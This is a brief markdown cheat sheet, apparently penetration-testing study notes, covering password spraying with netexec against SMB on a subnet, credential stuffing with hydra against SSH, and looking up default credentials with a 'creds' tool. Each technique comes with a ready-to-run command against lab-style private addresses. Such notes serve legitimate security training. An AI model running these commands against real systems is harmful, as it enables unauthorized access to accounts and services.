## Password Spraying

Spray a password across an entire subnet and a userlist for the smb service.
```shell
netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
```

---
## Credential Stuffing

Type of brute force attack in which an attacker uses stolen credentials from one service to attempt to acces an other.
If we have a list of username:password we can try
```shell
hydra -C user_pass.list ssh://10.100.38.23
```

---
## Default Credentials
- Look on google for default creds
- Use the `creds` tool

```shell
creds search <service>
```
